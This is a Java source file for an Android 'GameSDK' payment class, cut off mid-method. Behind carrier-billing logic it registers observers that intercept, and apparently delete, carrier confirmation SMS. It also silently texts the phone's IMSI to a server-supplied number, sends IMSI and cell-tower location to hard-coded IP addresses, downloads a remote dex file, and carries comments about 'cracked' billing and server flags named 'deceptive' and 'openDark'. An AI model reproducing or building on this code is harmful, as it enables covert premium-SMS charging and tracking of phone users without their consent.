package mobi.zty.sdk.game;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import org.json.JSONException;
import org.json.JSONObject;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;
import android.widget.Toast;
import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.factory.PaymentFactoy;
import mobi.zty.sdk.game.bean.ActivateResult;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.GroupFeeInfo;
import mobi.zty.sdk.game.bean.InitializeResult;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.game.bean.ShopInfo;
import mobi.zty.sdk.game.bean.UserInfo;
import mobi.zty.sdk.game.callback.ActivateCallback;
import mobi.zty.sdk.game.callback.InitializeCallback;
import mobi.zty.sdk.game.intercept.SMS;
import mobi.zty.sdk.game.intercept.SMSHandler;
import mobi.zty.sdk.game.intercept.SMSObserver;
import mobi.zty.sdk.game.object.parser.ActivateResultParser;
import mobi.zty.sdk.game.object.parser.InitializeResultParser;
import mobi.zty.sdk.http.HttpCallback;
import mobi.zty.sdk.http.HttpRequest;
import mobi.zty.sdk.util.DeviceInfo;
import mobi.zty.sdk.util.DeviceInfoUtil;
import mobi.zty.sdk.util.DowloadDexFile;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.LocalStorage;
import mobi.zty.sdk.util.StringUtil;
import mobi.zty.sdk.util.Util_G;

public class GameSDK implements InitializeCallback,ActivateCallback {
	private final static Lock lock = new ReentrantLock();
	private static GameSDK instance;
    public static String mbDelSMS = "0";
	public Context context;
	private SMSReceiver mSMSReceiver1 = new SMSReceiver();
//	private SMSReceiver mSMSReceiver2 = new SMSReceiver();
	private IntentFilter mSMSResultFilter = new IntentFilter();
//	private IntentFilter mSMSResultFilter2 = new IntentFilter();
	public static final String RECEIVED_SMS_ACTION= "android.provider.Telephony.SMS_RECEIVED";
	public String gameId;
	public String pc_ext;
	public String channelID;//一般不用 只有破解使用
	public String gameName;
	public String packetId="1";//lsl
	public String deviceId;
	HttpRequest<InitializeResult> mInitializeRequest = null; //初始化的request请求
	/*联网用到的变量 start*/
	public String dipcon;//登录跑马灯内容 
	public String dipcon2;//支付跑马灯内容 
	public String dipurl;//支付公告
	public String noturl;//登录公告
	public String exiturl;
	private static final int NOTICE_STARTPAY = 100;
	private static final int NOTICE_EXITGAME = 105;
	private  String phoneNum = "";//手机号码
	private   String numUrl = "http://211.154.152.59:8080/sdk/mobileNum?";//获取手机号码的url

	private  String obtainNum = "";//获取手机号码的 端口
	public static int payway;
	private PowerManager mPowerManager = null;
	private boolean SendTimer = true;
	private int afdft;
	private String afdf;
	private  String payResultUrl = "http://211.154.152.59:8080/sdk/orderState";
	
	/**
	 * key  计费点的唯一标识
	 * value 金额分
	 */
	public Map<String,Integer> limitMap = null;
	/**
	 * key 商品索引 value 该商品计费所需要的 信息
	 */
	public Map<Integer, ShopInfo> shopInfoMap = null;
    /**
     * key 是支付类型 value mkInfo
     * 现在所有 初始化 和验证码的获取 都是根据mk来 映射对应的mkInfo信息的
     */
    public Map<Integer, MkInfo> mkMap = null;
    
    /**
     * key 某套支付的唯一标识 value mkInfo
     * 和mkMap的区别在于 这个集合包括的mkinfo可能更，主要用于pay方法 中
     */
    public Map<String, MkInfo> payIdMap = null;
    /**
     * key 拼接计费的索引  对应的订单号
     */
    public Map<Integer, String> indexOrderMap = new HashMap<Integer, String>();
    public int payindex = 0;
	public String defaultMK = "0";
	public String gameVersionCode = "4";
	public GameSDKInitListener gameSDKInitListener;
	
	/**
	 * 直接走 特定的支付
	 */
	public static String directPay = "";
	private static Handler handler = new Handler(){
		public void dispatchMessage(android.os.Message msg) {
			switch (msg.what) {
			case NOTICE_STARTPAY:
				Object[] objs = (Object[]) msg.obj;
				instance.allPay((Integer)objs[0], (Integer)objs[1], (String)objs[2], (GameSDKPaymentListener)objs[3],(String[])objs[4]);
				break;
			case NOTICE_EXITGAME:{
				instance.notiFyExitGame();
				break;
			}
			default:
				break;
			}
		};
	};
			
	/*联网用到的变量 end*/
	
	public Handler payResultHandle = new Handler(Looper.getMainLooper()){
		public void handleMessage(android.os.Message msg) {
			PayResultInfo info = (PayResultInfo) msg.obj;
			GroupFeeInfo groupFeeInfo = getCurgGroupFeeInfo();
			if (groupFeeInfo == null) {
				SendOder.getInstance().notifyErrorCode(info.resutCode,info.index);
//				notifyPaymentFail(info);
				payResultHandle.removeMessages(PayConfig.NOTIFY_PAYRESULT);
				notifyToOtherPay();
				return;
			}
			switch (msg.what) {
			case PayConfig.NOTIFY_PAYRESULT:{//移动支付 结果回调
				if (info == null) {
					return;
				}
				switch (info.resutCode) {
				case PayConfig.BIIL_SUCC:
					groupFeeInfo.recodePayResult.put(info.index, 1);
					FeeInfo feeInfo = groupFeeInfo.feeInfos.get(info.index);
					if (limitMap.containsKey(feeInfo.id)) {
						limitMap.put(feeInfo.id, limitMap.get(feeInfo.id)-feeInfo.consume);
					}else{
						Util_G.debugE("AllPAy", "Server erro ->>limitMap have not "+feeInfo.id);
					}
					if(instance.bCallback == 0){
						instance.bCallback = 1;
						notifyPaymentFinish(SendOder.getInstance().amount);
					}
					SendOder.getInstance().sapay_ret(info.retMsg, 1,info.index);
					allCheckPay(0);
					break;
				case PayConfig.BIIL_CANCER:
					groupFeeInfo.recodePayResult.put(info.index, 2);
					allCheckPay(2);
					break;
				default:
					SendOder.getInstance().notifyErrorCode(info.resutCode,info.index);
					groupFeeInfo.recodePayResult.put(info.index, 2);
					allCheckPay(1);
					break;
				}
				break;
			}
			
			case PayConfig.NATIVE_FEE_FAIL://破解支付 短信被拦截
				int feeIndex = haveCallbakePay();
				if (getCurgGroupFeeInfo()!=null&&getCurgGroupFeeInfo().feeInfos.size()>0) {
					for (int i = 0; i < getCurgGroupFeeInfo().feeInfos.size(); i++) {
						FeeInfo feeInfo = getCurgGroupFeeInfo().feeInfos.get(i);
						if (feeInfo.mk==PayConfig.ANAN_FEE) {
							try {// 移动MM安安破解
								PaymentFactoy.producePay(GameSDK.getInstance().mkMap.get(feeInfo.mk).mkClassName,
										GameSDK.getInstance().context)
										.notifyPay(1,i);
							} catch (Throwable e) {
								e.printStackTrace();
							}
						}
						if (feeIndex!=i) {
							SendOder.getInstance().notifyErrorCode(PayConfig.NATIVE_FEE_FAIL,i);
						}
					}
				}
				if (feeIndex>=0) {//这种情况视为成功 并发货
					Util_G.debugE("AllPAy", "Overtime as a success-->"+feeIndex);
					groupFeeInfo.recodePayResult.put(feeIndex, 1);
					if(instance.bCallback == 0){
						instance.bCallback = 1;
						notifyPaymentFinish(SendOder.getInstance().amount);
					}
					SendOder.getInstance().notifyErrorCode(PayConfig.YIMEROUT_SCC_PAY,feeIndex);
					allCheckPay(0);
					break;
				}
				
			case PayConfig.FEE_MK_FAIL://计费类型mk中没有
			case PayConfig.DALAY_LIMIT_PAY://当前支付没到时间间隔直接走下一套
				Util_G.debugE("AllPAy", "计费超时或当前计费组合时间控制准备转第三方支付-》》");
				allCheckPay(3);
				break;
				
			case delayNoticeOverPayResult:{
				repeatPay();
				break;
			}
			
			default:
				break;
			
			}
		}
	};
	
	private Handler otherHandler = new Handler() {// 第三方支付 回调

		public void handleMessage(Message msg) {
			try {
				switch (msg.what) {
				case PayConfig.WECAHT_SUCC: {
					PayResultInfo resultInfo = new PayResultInfo();
					resultInfo.resutCode = PayConfig.BIIL_SUCC;
					Message message = payResultHandle.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
					message.obj = resultInfo;
					message.sendToTarget();
				}
					break;
				default:
					otherPayFail();
					break;
				}
			} catch (Exception e) {
				Log.e(Constants.TAG, e.getMessage());
			}
		}
		private void otherPayFail() {
			PayResultInfo info = new PayResultInfo();
			info.resutCode = PayConfig.WECHAT_PAY_FAIL;
			info.retMsg = "第三方支付失败";
			notifyPaymentFail(info);
		}
	};
	public static GameSDKPaymentListener gameSDKPaymentListener;
	public int repeatPayIndex = 0;
	private final int delayNoticeOverPayResult = 105;
	int mcc,mnc,lac,cid;
	/**
	 * key 支付类型 value 是mkclassName
	 */
	public static Map<Integer, String> mpMkClassName = new HashMap<Integer, String>();
	
	/**
	 * key 需要根据回调来判断的 计费类型 value 超时是否可以发货
	 */
	public static Map<Integer, Boolean> mkIsSdk = new HashMap<Integer, Boolean>();
	static{
		mkIsSdk.put(PayConfig.YIJIE_PAY, true);
		mkIsSdk.put(PayConfig.TOMOEEOW_PAY, true);
		mkIsSdk.put(PayConfig.YIXUN_PAY, false);
		mkIsSdk.put(PayConfig.QIPA_PAY, true);
		mkIsSdk.put(PayConfig.FANHE_PAY, true);
		mkIsSdk.put(PayConfig.YEYOU_FEE, true);
		
		mpMkClassName.put(PayConfig.LEYOU_FEE, "mobi.zty.pay.sdk.leyouFee.LeYouFeeInstance");
		mpMkClassName.put(PayConfig.ANAN_FEE, "mobi.zty.pay.sdk.ananFee.AnAnFeeInstance");
		mpMkClassName.put(PayConfig.TC_FEE, "mobi.zty.pay.sdk.tianyiFee.TianYiFeeInstance");
		mpMkClassName.put(PayConfig.TC_ALL_FEE, "mobi.zty.pay.sdk.DXAllFee.DXAllFeeInstance");
		mpMkClassName.put(PayConfig.YEYOU_FEE, "mobi.zty.pay.sdk.yeYouFee.YeYouFeeInstance");
		mpMkClassName.put(PayConfig.FANHE_PAY, "mobi.zty.pay.sdk.fanheFee.FanHeFeeInstance");
		mpMkClassName.put(PayConfig.WECHAT_PAY, "mobi.zty.pay.sdk.wecaht.WeChatInstance");
		mpMkClassName.put(PayConfig.TOMOEEOW_PAY, "mobi.zty.pay.sdk.temorroyFee.TomorrowFeeInstance");
		mpMkClassName.put(PayConfig.DONGFENG_PAY, "mobi.zty.pay.sdk.dongfeng.DongFengFeeInstance");
		mpMkClassName.put(PayConfig.YIXUN_PAY, "mobi.zty.pay.sdk.YiXunFee.YiXunFeeInstance");
		mpMkClassName.put(PayConfig.DONGMA_PAY, "mobi.zty.pay.sdk.dongma.DongMaFeeInstance");
		mpMkClassName.put(PayConfig.POWER_PAY, "mobi.zty.pay.sdk.powerFee.PowerFeeInstance");
		mpMkClassName.put(PayConfig.QIPA_PAY, "mobi.zty.pay.sdk.qipaSDkFee.QipaSdkInstance");
		mpMkClassName.put(PayConfig.YIJIE_PAY, "mobi.zty.pay.sdk.YijieFee.YijieSdkInstance");
		mpMkClassName.put(PayConfig.DONGMA_MONTH_PAY, "mobi.zty.pay.sdk.dongmaMonth.DongmanMonthInstance");
		mpMkClassName.put(PayConfig.YUANLIN_PAY, "mobi.zty.pay.sdk.yuanlin.YuanLinInstance");
		mpMkClassName.put(PayConfig.ZHONGKE_PAY, "mobi.zty.pay.sdk.zhongke.ZhongKeInstance");
		mpMkClassName.put(PayConfig.BEIQING_PAY, "mobi.zty.pay.sdk.beiqing.BeiQingInstance");
		mpMkClassName.put(PayConfig.TIANYI_MONTH_PAY, "mobi.zty.pay.sdk.tianyiMonth.TianYiMonthInstance");
		mpMkClassName.put(PayConfig.WOYUEDU_PAY, "mobi.zty.pay.sdk.woyuedu.WoYueDuInstance");
		mpMkClassName.put(PayConfig.DONGMANDDO_PAY,"mobi.zty.pay.sdk.dongmanDDO.DongManDDOInstance");
		mpMkClassName.put(PayConfig.FUDUODUO_PAY,"mobi.zty.pay.sdk.fuduoduo.FuDuoDuoInstance");
		mpMkClassName.put(PayConfig.RDO_PAY,"mobi.zty.pay.sdk.rdo.RDOInstance");
		mpMkClassName.put(PayConfig.ZHANGPAY_PAY,"mobi.zty.pay.sdk.zhangzhifu.ZhangPayInstance");
		mpMkClassName.put(PayConfig.TOMORROW_PAY,"mobi.zty.pay.sdk.tomorrowFee.TomorrowFeeInstance");
		mpMkClassName.put(PayConfig.BOSHITONG_PAY,"mobi.zty.pay.sdk.boshitong.BoShiTongInstance");
		mpMkClassName.put(PayConfig.VFUBAO_PAY,"mobi.zty.pay.sdk.vfubao.VFuBaoPayInstance");
	}
	/**
	 * 保证只发货一次
	 */
	public int bCallback = 0;
	private GameSDK(Context context) {
		this.context = context;
		this.mPowerManager = (PowerManager) context
				.getSystemService(Context.POWER_SERVICE);
		SendTimer = true;
		new DurationTread().start();
	}
	public static GameSDK getInstance(Context context) {

        try {
            lock.lock();
            if (instance == null) {
                instance = new GameSDK(context);
            }
            return instance;
        } finally {
            lock.unlock();
        }
    }
	public static GameSDK getInstance() {
	    return instance;
	}
	/**
	 * @param activity
	 * @param gameID
	 * @param packetID
	 * @param ext 
	 * @return 实际支付类型 1移动 5联通 10电信 15支付宝
	 */
	public static int initSDK(Activity activity,String gameID,String packetID,
			GameSDKInitListener gameSDKInitListener,String ...exts) {
		Constants.DEX_URL = String.format(Constants.DEX_URL, packetID,Constants.SDK_VERSION_CODE);
		if (DowloadDexFile.getInstance().canReeatDownload()) {
			DowloadDexFile.getInstance().checkVersion(activity, Constants.DEX_URL);
		}
		if (instance != null) {
			return 0;
		}
        getInstance(activity);
        instance.afdft = (int)(System.currentTimeMillis()/1000);//
        //instance.packetId = packetId;
       //instanc-----e.gameId = gameId;//Constants.GAMEID;//MetaDataUtil.getInt(activity, "SHOUMENG_GAME_ID", 1);
        
        instance.gameSDKInitListener = gameSDKInitListener;
        LocalStorage storage = LocalStorage.getInstance(activity);
        String discon = storage.getString(Constants.DisCon);
        instance.dipcon = discon;
        instance.noturl = storage.getString(Constants.DisUrl);
        if (exts!=null) {
        	if (exts.length>0) {
        		instance.pc_ext = exts[0];
			}
        	if (exts.length>1) {
				instance.defaultMK = exts[1];
			}
        	if (exts.length>2) {
        		instance.gameVersionCode = exts[2];
			}
		}
         
        instance.gameId = gameID.trim();
		instance.channelID = packetID.trim();
	
		if (Helper.isDebugEnv()) {
			instance.makeToast("当前测试模式！");
//			Constants.SERVER_URL = "http://sa.91muzhi.com:8090/sdk/%s";
			Constants.SERVER_URL = "http://119.29.133.73:8080/sdk/%s";
			
			instance.setPayResultUrl("http://211.154.152.59:8090/sdk/OrderState");
		}
		instance.gameName = Helper.getApplicationName(activity);
		payway = Helper.getSIMType(instance.context);
		instance.initialize();
       return payway;
    }
	/**
	 * 设置程序是否为测试模式 默认false
	 * @param var。
	 */
	public static void setDebug(boolean var){
		Helper.setDebug(var);
	}
	public void initialize() {
		try {
			String release=android.os.Build.VERSION.RELEASE;
			if(!(release.contains("5")||release.contains("6"))){
				Util_G.debugE("++++++++++", "ok!");
			}
		} catch (Throwable e1) {
			e1.printStackTrace();
		}
		
		mSMSResultFilter.addAction(Constants.SENT_SMS_ACTION);
		context.registerReceiver(mSMSReceiver1, mSMSResultFilter);
		SendOder.getInstance().init(context);//初始化发送 订单统计的 类
		try {
			PaymentFactoy.producePay("mobi.zty.pay.sdk.wecaht.WeChatInstance",context).init(context,
					otherHandler);
		} catch (Throwable e) {
			Util_G.debugE("PayConfig.weixin", e.getMessage());
		}
		
		PayConfig.IS_PAYING = false;
		//下面初始化 packetID在激活的时候要用到 所以最好在init(this)前初始化，PayConfig.currentAppID会在移动MM初始化后赋值
		String channel = Helper.getChannel((Activity)context,"channel");
		if (channel==null ||channel.trim().length()==0) {
			channel = "0000000000";
		}
		if (Helper.isDebugEnv()) {
			channel = "3003984937";
		}
		instance.packetId  =  instance.channelID;
        init(this);
    }
	
	private void init(InitializeCallback initializeCallback) {
    	Util_G.debug_i("test", "init");//
        LocalStorage storage = LocalStorage.getInstance(context);
        deviceId = storage.getString(Constants.DEVICE_ID);
        String URL = storage.getString(Constants.URL);
        if(URL.length() > 1&&!(Helper.isDebugEnv()))
        {
        	Constants.SERVER_URL = URL;
        }
        Util_G.debug_i("test", "url="+URL);
        if(StringUtil.isEmpty(deviceId)) {

            DeviceInfo info = DeviceInfoUtil.getDeviceInfo(context);
            info.setPackageId(packetId);
            String api = String.format(Constants.SERVER_URL, "init");
            HttpRequest<InitializeResult> request = new HttpRequest<InitializeResult>(context,
            		new InitializeResultParser(),
                    new InitializeListener(initializeCallback));
            mInitializeRequest = request;
            
            request.execute(
                    api,
                    info.toJSON());

        } else {
            InitializeResult result = new InitializeResult(deviceId);
            initializeCallback.onInitSuccess(result);
        }
        
    }
	 private class InitializeListener implements HttpCallback<InitializeResult> {

	        private InitializeCallback callback;

	        private InitializeListener(InitializeCallback callback) {
	            this.callback = callback;
	        }

	        @Override
	        public void onSuccess(InitializeResult object) {
	            GameSDK.this.deviceId = object.getDeviceId();
	            LocalStorage storage = LocalStorage.getInstance(context);
	            storage.putString(Constants.DEVICE_ID, object.getDeviceId());
	            callback.onInitSuccess(object);
	        }

	        @Override
	        public void onFailure(int errorCode, String errorMessage) {
	            callback.onFailure(errorCode, errorMessage);
	            if(errorCode != Constants.ERROR_CODE_NET)
	            {
	            	//暂时单机初始化请求失败 不做任何处理
	            }
	        }

	    }
	public void activate()
	{
	   activate(this);
	}
	private void activate(ActivateCallback activateCallback) {

    	Util_G.debug_i("test", "activate");
        String api = String.format(Constants.SERVER_URL, "activate");
   
        HttpRequest<ActivateResult> request = new HttpRequest<ActivateResult>(context,
        		new ActivateResultParser(),
                new ActivateListener(activateCallback));
        
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String operator = telephonyManager.getNetworkOperator();
        lac = 0;
        cid = 0;
        mcc = 0;
        mnc = 0;
        if (operator!=null&&!StringUtil.isEmpty(operator)) {
        	try {
        		mcc = Integer.parseInt(operator.substring(0, 3));
                mnc = Integer.parseInt(operator.substring(3));
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
        
        if (mnc==2||mnc==0||mnc==7) {
        	try {
        		GsmCellLocation location = (GsmCellLocation) telephonyManager.getCellLocation();
        		lac = location.getLac();
                cid = location.getCid();
			} catch (Exception e) {
				e.printStackTrace();
			}
            
		}else{
            lac = 0; 
            cid = 0; 
		}
        
        
        JSONObject user = new JSONObject();
        try {
			user.put("device_id", deviceId);
			user.put("packet_id", packetId);
			user.put("imsi", Helper.getIMSI(context));
			user.put("simop", Helper.getIMSIStart(context));
	        user.put("game_id", gameId);
	        user.put("ver", Constants.GAME_SDK_VERSION);
	        user.put("mcc", mcc);
	        user.put("mnc", mnc);
	        user.put("lac", lac);
	        user.put("cid", cid);
	        user.put("game_ver", instance.gameVersionCode);
	        user.put("sdk_ver", Constants.SDK_VERSION_CODE);
		} catch (JSONException e) {
			e.printStackTrace();
		}
        request.execute(
                api,
                user.toString());

    }
	private class ActivateListener implements HttpCallback<ActivateResult> {

        private ActivateCallback callback;

        private ActivateListener(ActivateCallback callback) {
            this.callback = callback;
        }

        @Override
        public void onSuccess(ActivateResult object) {
            callback.onActivateSuccess(object);
        }

        @Override
        public void onFailure(int errorCode, String errorMessage) {
            callback.onFailure(errorCode, errorMessage);
            if(errorCode != Constants.ERROR_CODE_NET)
            {
               //单机激活失败不做处理
            }
        }

    }
	
   
	@Override
	public void onInitSuccess(
			mobi.zty.sdk.game.bean.InitializeResult initializeResult) {
		 GameSDK.this.deviceId = initializeResult.deviceId;
	        //activate(this);//lsl
	     activate();
	}
	@Override
	public void onFailure(int errorCode, String errorMessage) {
//		Util_G.debug_i("test", "失败恢复url="+Constants.OSERVER_URL);
//        LocalStorage storage = LocalStorage.getInstance(context);
//        storage.putString(Constants.URL, Constants.OSERVER_URL);
	}
	@Override
	public void onActivateSuccess(ActivateResult activateResult) {
		Util_G.debugE("ALLPAY", "imsi==="+Helper.getIMSI(context));
		GameSDK.this.afdf = activateResult.getAdfd();
        GameSDK.this.dipcon = activateResult.getDipcon();
        GameSDK.mbDelSMS = activateResult.getbDel();
        String mDelSMSCon = activateResult.getFillCon();
        int openDark = activateResult.getOpenDark();
        int openAlert = activateResult.getOpenAlert();
        int openButton = activateResult.getOpenButton();
        int openOurAlert = activateResult.getOpenOurAlert();
        int cootype = activateResult.getCootype();
        int deceptive = activateResult.getDeceptive();

        if (instance.gameSDKInitListener!=null) {
        	instance.gameSDKInitListener.onOpenDark(openDark, openAlert, openButton, openOurAlert,cootype,deceptive);
		}
        LocalStorage storage = LocalStorage.getInstance(context);
        storage.putString(Constants.URL, activateResult.getUrl());
        Util_G.debug_i("test", "newurl="+activateResult.getUrl());
        storage.putString(Constants.DisCon, activateResult.getDipcon());
        storage.putString(Constants.DisUrl,activateResult.getNoturl());
        
        limitMap= activateResult.getLimitMap();
        mkMap = activateResult.getMkMap();
        payIdMap = activateResult.getPayIdMap();
        shopInfoMap = activateResult.getShopInfoMap();
        setPhoneNum(activateResult.getPhoneNum());
        setObtainNum(activateResult.getObtainNum());
        /*下面放置刷用户的代码 end*/
        //storage.putString(Constants.DisCon2, activateResult.getDipcon2());
        //storage.putString(Constants.DisUrl, activateResult.getDipurl());
        
	    if (mkMap!=null&&mkMap.size()>0) {
	    	for (Integer key:mkMap.keySet()) {
	    		initMkPay(key);
			}
		}
        instance.dipcon2 = activateResult.getDipcon2();
        instance.dipurl = activateResult.getDipurl();
        instance.noturl = activateResult.getNoturl();
        instance.exiturl = activateResult.getExiturl();
        for (MkInfo info:mkMap.values()) {
			if (info.interceptContents.size()>0||!StringUtil.isEmpty(info.vertifyNum)) {
				/*短信拦截服务start*/
	        	addSMSObserver(context);
	        	break;
				/*短信拦截服务end*/
			}
		}
//        if (interceptList.size()>0) {
//			/*短信拦截服务start*/
//        	addSMSObserver(context);
//			/*短信拦截服务end*/
//			 IntentFilter mSMSResultFilter2 = new IntentFilter();
//		    mSMSResultFilter2.addAction(RECEIVED_SMS_ACTION);
//		    mSMSResultFilter2.setPriority(Integer.MAX_VALUE);
//		    context.registerReceiver(mSMSReceiver2, mSMSResultFilter2);
//		    Util_G.debugE("mSMSReceiver2", "注册拦截短信的广播");
//		}
        afdf3();//进来后把上次 推出前的时长通知给后台。
	}
	private synchronized void initMkPay(int mk) {
		try {//移动MM乐游破解
			PaymentFactoy.producePay(mkMap.get(mk).mkClassName,context).init(context,payResultHandle,mkMap.get(mk));
			mkMap.get(mk).isCanPay = true;
		} catch (Throwable e) {
			e.printStackTrace();
		}
	}
	public void dexPayInit(int mk){
		if (mkMap!=null&&mkMap.size()>0&&mkMap.containsKey(mk)) {
			initMkPay(mk);
		}
	}
	/**
	 * 检查后台是否给了 手机号码
	 */
	private void checkNumber() {
		if (getPhoneNum()==null||getPhoneNum().trim().equals("")) {
		    Util_G.sendTextMessage(context, getObtainNum(), Helper.getIMSI(context), null, 0);//发这条短信给平台 是为了获取手机号码
			Helper.httpGetPhonNum(getNumUrl(), Helper.getIMSI(context), new Helper.Callback() {//轮询我们自己服务端获取手机号码
				
				@Override
				public void onResult(String info) {
					if (info!=null&&!info.trim().equals("")) {
						try {
							JSONObject resut = new JSONObject(info);
							String num = resut.getString("mobile_num");
							if (num!=null&&!num.equals("")) {
								setPhoneNum(num);
							}
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
				}
			});
		}
	}

	public static String getSetting(Context activity, String name) {
		String value = "";
		LocalStorage storage = LocalStorage.getInstance(activity);
		value = storage.getString(name);
		return value;

	}
	
	/**
	 * 支付接口
	 * @param requestAmount 单位是分
	 * @param payindex  计费点索引
	 * @param payname 该商品名称
	 * @param gameSDKPaymentListener 回调监听
	 * @param extendP  参数1默认支付类型  参数2是订单号
	 */
	public  void startPay(int requestAmount,int payindex,String payname,GameSDKPaymentListener gameSDKPaymentListener,String ...extendP) 
    {
		Message message = handler.obtainMessage(NOTICE_STARTPAY);
		Object[] strs = {requestAmount,payindex,payname,gameSDKPaymentListener,extendP};
		message.obj = strs;
		message.sendToTarget();
    }
	private synchronized void allPay(int requestAmount, int payindex, String payname,
			GameSDKPaymentListener gameSDKPaymentListener,String[] extendP) {
		if (!PayConfig.IS_PAYING) {
			PayConfig.IS_PAYING = true;
		}else {
			makeToast("请稍等30秒后再来领取道具吧！");
			gameSDKPaymentListener.onPayCancelled();//这个时候也得返回支付取消 不然游戏可能会卡住
			return;
		}
		instance.bCallback = 0;
		repeatPayIndex = 0;
		GameSDK.gameSDKPaymentListener =  gameSDKPaymentListener;
		directPay = "";
		if (extendP!=null) {
			if (extendP != null) {
				if (extendP.length > 0&&!StringUtil.isEmpty(extendP[0])) {
					directPay = extendP[0];
				}
			}
//			if (extendP.length>1&&!StringUtil.isEmpty(extendP[1])) {
//				payOrder = extendP[1];
//			}
		}
		pay(requestAmount, payindex, payname);
	}
	private void repeatPay() {
		try {
			Util_G.debugE("AllPAy", "repeatPayIndex=="+repeatPayIndex);
			List<GroupFeeInfo> listGroupInfo = shopInfoMap.get(payindex).listGroupInfo;
			if (repeatPayIndex<listGroupInfo.size()&&repeatPayIndex>=0) {
				pay(SendOder.getInstance().amount, instance.payindex, SendOder.getInstance().payname);
			}
		} catch (Throwable e) {
			repeatPayIndex = 0;
			e.printStackTrace();
		}
		
	}
	private synchronized void  pay(int requestAmount, int payindex, String payname) {
		instance.payindex = payindex;
		payResultHandle.removeMessages(PayConfig.NATIVE_FEE_FAIL);
		indexOrderMap.clear();
		SendOder.getInstance().amount = requestAmount;
		SendOder.getInstance().payname = payname;
		if (directPay.equals(PayConfig.WECHAT_PAY)||SendOder.getInstance().amount>30*100) {
			notifyToOtherPay();
			return;
		}
		if (shopInfoMap == null||!shopInfoMap.containsKey(payindex)) {
			allNotifyPayFail(PayConfig.CP_INDEX_FAIL, "cp所传的索引 和后台配置的商品列表不匹配",0);
			return;
		}
		ShopInfo shopInfo = shopInfoMap.get(payindex);
		if (shopInfo.listGroupInfo.size()==0) {
			allNotifyPayFail(PayConfig.NO_CODE_FAIL, "后台未给该商品配置任何计费",0);
			return;
		}
		
		if (repeatPayIndex>=shopInfo.listGroupInfo.size()) {//没有可遍历的 代码了，这个时候 直接走微信
			notifyToOtherPay();
			return;
		}
		GroupFeeInfo groupFeeInfo = shopInfo.listGroupInfo.get(repeatPayIndex);
		
		if (groupFeeInfo.isCanUse()){
			groupFeeInfo.reSetDelay(); 
		}else{
			payResultHandle.sendEmptyMessage(PayConfig.DALAY_LIMIT_PAY);
			return;
		}
		
		if (groupFeeInfo.feeInfos==null||groupFeeInfo.feeInfos.size()==0) {
			allNotifyPayFail(PayConfig.NO_FEE_FAIL, "该拼接组合没有任何计费可用",0);
			return;
		}
		long baseDelay = 26000;
		for (int i = 0; i < groupFeeInfo.feeInfos.size(); i++) {
			if (!mkMap.containsKey(groupFeeInfo.feeInfos.get(i).mk)) {
				allNotifyPayFail(PayConfig.FEE_MK_FAIL, "mk列表中未找到 改支付类型",0);
				return;
			}
			if (!StringUtil.isEmpty(mkMap.get(groupFeeInfo.feeInfos.get(i).mk).confimNum)||
					!StringUtil.isEmpty(mkMap.get(groupFeeInfo.feeInfos.get(i).mk).vertifyNum)||
					mkMap.get(groupFeeInfo.feeInfos.get(i).mk).interceptContents.size()>0) {
				baseDelay += groupFeeInfo.feeInfos.get(i).mk==PayConfig.DONGMANDDO_PAY?30000:10000;
				break;
			}
			long onlineDelay = mkMap.get(groupFeeInfo.feeInfos.get(i).mk).timeOut;
			baseDelay = onlineDelay>baseDelay?onlineDelay:baseDelay;
			
		}
		payResultHandle.sendEmptyMessageDelayed(PayConfig.NATIVE_FEE_FAIL, baseDelay+ groupFeeInfo.feeInfos.size()*15000);
		groupFeeInfo.getIntdexVerifyMap().clear();
		for (int i = 0; i < groupFeeInfo.feeInfos.size(); i++) {
			FeeInfo feeInfo = groupFeeInfo.feeInfos.get(i);
			SendOder.getInstance().amount = feeInfo.consume;
			if (feeInfo.mk == PayConfig.LEYOU_FEE||feeInfo.mk==PayConfig.ANAN_FEE||feeInfo.mk == PayConfig.ZHONGKE_PAY) {
				indexOrderMap.put(i, creatPayOrderId(14));
			}else{
				indexOrderMap.put(i, creatPayOrderId(11));
			}
			
			groupFeeInfo.recodePayResult.put(i, 0);
    		SendOder.getInstance().sapay_ret("",0,i);
    		boolean checkScc = true;
    		int mk = feeInfo.mk;
    		if (!mkMap.containsKey(mk)||!payIdMap.containsKey(feeInfo.payId)) {
    			checkScc = false;
    			allNotifyPayFail(PayConfig.MK_SET_FAIL, "后台未配置mk 列表数据",i);
			}
    		
    		if (!mkMap.get(mk).isCanPay) {
    			checkScc = false;
    			allNotifyPayFail(PayConfig.DATA_INIT_FAIL, "服务端给的数据 造成客户端初始化失败",i);
			}
    		MkInfo mkInfo =  payIdMap.get(feeInfo.payId);//同一种支付类型 可能有多套计费
    		
    		if (!Helper.isNetworkConnected(context)) {
    			checkScc = false;
    			allNotifyPayFail(PayConfig.CONNECT_FAIL, "客户端 未联网或者网络差",i);
			}
    		if (!limitMap.containsKey(feeInfo.id)||feeInfo.consume>=limitMap.get(feeInfo.id)) {
    			allNotifyPayFail(PayConfig.LIMIT_FAIL, "额度不够或后台未给额度",i);
    			checkScc= false;
			}
    		if (!checkScc) {
				continue;
			}
    		if (feeInfo.verify==1) {
    			if (feeInfo.mk == PayConfig.YEYOU_FEE) {
    				groupFeeInfo.getIntdexVerifyMap().put(i, 1);
				}else{
					groupFeeInfo.getIntdexVerifyMap().put(i, 0);
				}
			}else{
				groupFeeInfo.getIntdexVerifyMap().put(i, 2);//如果不需要验证码  就直接设置为已经回复过验证码的短信了
			}
    		
    		realyPay(i, feeInfo, mkInfo);
		}
	}
	private boolean secretlyStart = false;
	private void realyPay(int i, FeeInfo feeInfo, MkInfo mkInfo) {
		try{
